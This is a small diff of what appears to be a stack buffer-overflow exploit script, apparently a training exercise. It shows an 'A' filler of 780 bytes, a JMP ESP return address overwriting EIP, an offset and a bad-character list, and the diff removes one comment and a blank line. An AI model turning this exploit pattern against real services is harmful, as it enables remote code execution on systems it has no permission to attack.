@@ -9,7 +9,7 @@ try:
   
   filler = b"A"*780
   eip = b"\x83\x0c\x09\x10" # JMP ESP 
-  offset = b"C"*4  #don't know the point of this...
+  offset = b"C"*4
   badchars = (
   	b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14"
 	b"\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x27\x28"
@@ -95,4 +95,3 @@ try:
   
 except socket.error:
   print("Could not connect!")
-
